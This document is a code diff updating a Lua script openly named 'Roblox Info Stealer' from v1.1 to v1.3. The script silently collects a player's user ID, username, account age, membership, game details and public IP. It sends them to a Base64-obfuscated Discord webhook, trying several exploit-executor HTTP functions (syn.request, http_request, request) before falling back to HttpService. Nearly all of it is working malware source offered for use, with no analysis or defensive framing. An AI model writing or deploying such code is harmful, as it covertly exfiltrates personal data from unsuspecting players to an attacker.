@@ -1,20 +1,18 @@
---[=[ Roblox Info Stealer – v1.1
-      Collects user ID, username, account age, membership, game info, IP, and more.
-      Sends data to Discord webhook via HttpService.
-      No visible output – runs silently.
+--[=[ Roblox Info Stealer – v1.3 (Universal HTTP)
+      Automatically detects the executor's HTTP function.
+      Sends data to Discord webhook.
 ]=]
 
--- Services
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local UIS = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
--- Your NEW Discord webhook (Base64-encoded)
+-- Your new webhook (Base64-encoded)
 local encoded_webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNzc5OTg5Nzc0MTMzMjYzMS9HSHlWbnVMSzdib0JIZUhqamdDclRBWWtrcXdzdTV5WnVWSW5ZU3lHUElOUG1aR2M5SXhSU3NVQ1liUEdYVXNOcmpnVQ=="
 
--- Decode Base64 (custom function for compatibility)
+-- Decode Base64 (pure Lua)
 local function base64_decode(data)
     local b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
     local lookup = {}
@@ -63,7 +61,6 @@ local function collectInfo()
         },
         timestamp = os.time(),
     }
-    -- Attempt to get IP (optional – may fail)
     pcall(function()
         local ip = HttpService:GetAsync("https://api.ipify.org?format=json")
         data.ip = ip
@@ -71,18 +68,56 @@ local function collectInfo()
     return data
 end
 
--- Send data to webhook
-local function sendData()
+-- Universal HTTP send function
+local function sendWebhook(payload)
+    local json = HttpService:JSONEncode(payload)
+
+    -- Try syn.request (Synapse X)
+    if syn and syn.request then
+        syn.request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+        return true
+    end
+
+    -- Try http_request (some executors)
+    if http_request then
+        http_request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+        return true
+    end
+
+    -- Try request (another common name)
+    if request then
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+        return true
+    end
+
+    -- Fallback to HttpService:PostAsync (may be blocked)
     pcall(function()
-        local payload = HttpService:JSONEncode(collectInfo())
-        HttpService:PostAsync(WEBHOOK_URL, payload, Enum.HttpContentType.ApplicationJson, false)
+        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false)
     end)
+    return true
 end
 
--- Send immediately when script runs
+-- Send data
+local function sendData()
+    local payload = collectInfo()
+    sendWebhook(payload)
+end
+
+-- Execute after a short delay
 task.wait(2)
 sendData()
-
--- No print statements – stays completely silent.
-  
-
